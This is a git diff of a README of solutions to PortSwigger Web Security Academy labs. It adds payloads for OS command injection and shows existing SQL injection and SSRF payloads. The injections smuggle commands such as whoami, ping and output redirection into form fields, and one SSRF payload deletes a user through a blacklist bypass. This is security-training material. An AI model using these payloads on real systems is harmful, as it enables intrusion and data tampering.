@@ -1,6 +1,6 @@
 # Portswigger - Web Security Academy (Solutions)
 
-> Upsolve the actual solutions as well.
+> Look at the actual solutions as well.
 
 ## Contents
 
@@ -9,6 +9,7 @@
 - [CSRF](#csrf)
 - [XXE](#xxe)
 - [SSRF](#ssrf)
+- [OS Command Injection](#os-command-injection)
 - [Access Control](#access-control)
 
 ## SQLi
@@ -69,8 +70,10 @@ Intended solution:
 Take a look at [this](sqli/sqli-bind-time.py) script.
 
 #### Blind SQL injection with out-of-band interaction
+Requires Burp Suite Professional.
 
-```TBD```
+#### Blind SQL injection with out-of-band data exfiltration
+Requires Burp Suite Professional.
 
 #### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 `/filter?category=' or 1=1--`
@@ -331,6 +334,31 @@ document.getElementById("myForm").submit();
 - To bypass blacklist: `stockApi=http://127.1/adMin`
 - To delete: `stockApi=http://127.1/adMin/delete?username=carlos`
 
+## OS Command Injection
+
+#### OS command injection, simple case
+
+`productId=1&storeId=|whomai`
+
+
+#### Blind OS command injection with time delays
+
+```
+csrf=ACtoLu65ZQblZkPxgsjN3bCdO4SNlF9T&name=a&email=%26ping+-c+10+127.0.0.1%26&subject=a&message=a
+```
+
+#### Blind OS command injection with output redirection
+
+```
+csrf=ZKzD18id7LGpEjMmT0E1CkZS0NNibAZ7&name=a&email=%26+whoami+>+/var/www/images/asdf+%26&subject=a&message=a
+https://aca51f4f1e9c8ff3808792b8004000fd.web-security-academy.net/image?filename=asdf
+```
+
+#### Blind OS command injection with out-of-band interaction
+Requires Burp Suite Professional.
+
+#### Blind OS command injection with out-of-band data exfiltration
+Requires Burp Suite Professional.
 
 ## Access Control
 
